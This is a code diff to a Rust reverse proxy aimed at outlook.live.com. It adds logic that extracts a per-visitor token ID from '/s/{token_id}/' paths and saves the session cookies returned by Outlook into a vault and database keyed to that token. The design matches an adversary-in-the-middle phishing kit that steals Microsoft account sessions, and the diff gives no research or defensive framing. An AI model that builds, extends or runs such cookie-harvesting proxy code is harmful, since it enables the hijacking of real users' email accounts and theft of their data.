@@ -2,6 +2,8 @@ use actix_web::{HttpRequest, HttpResponse, Responder, http::header, web};
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 
+use crate::cookie_capture::CookieCapture;
+
 // Target Microsoft Outlook domain
 const TARGET_DOMAIN: &str = "outlook.live.com";
 const TARGET_URL: &str = "https://outlook.live.com";
@@ -114,6 +116,7 @@ pub async fn proxy_handler(
     req: HttpRequest,
     body: web::Bytes,
     config: web::Data<ProxyConfig>,
+    state: web::Data<crate::AppState>,
 ) -> impl Responder {
     let client = reqwest::Client::builder()
         .timeout(std::time::Duration::from_secs(30))
@@ -124,7 +127,20 @@ pub async fn proxy_handler(
     // Build target URL
     let target_url = format!("{}{}", config.target_url, req.uri().path_and_query().map(|p| p.as_str()).unwrap_or("/"));
     
-    println!("[proxy] {} {} → {}", req.method(), req.uri(), target_url);
+    // Extract token_id from path if present (e.g., /s/{token_id}/...)
+    let path = req.uri().path();
+    let token_id = if path.starts_with("/s/") {
+        let parts: Vec<&str> = path.split('/').collect();
+        if parts.len() > 2 {
+            Some(parts[2].to_string())
+        } else {
+            None
+        }
+    } else {
+        None
+    };
+    
+    println!("[proxy] {} {} → {} (token_id: {:?})", req.method(), req.uri(), target_url, token_id);
     
     // Build proxy headers
     let headers = build_proxy_headers(&req, &config);
@@ -154,6 +170,14 @@ pub async fn proxy_handler(
     
     let status = response.status();
     let response_headers = response.headers().clone();
+    
+    // Capture cookies from response if token_id is present
+    if let Some(tid) = token_id {
+        let cookie_capture = CookieCapture::new(state.vault.clone());
+        if let Err(e) = cookie_capture.capture_from_response(&state.pool, &tid, &response_headers).await {
+            eprintln!("[proxy] Failed to capture cookies: {}", e);
+        }
+    }
     
     // Build response
     let mut resp = HttpResponse::build(
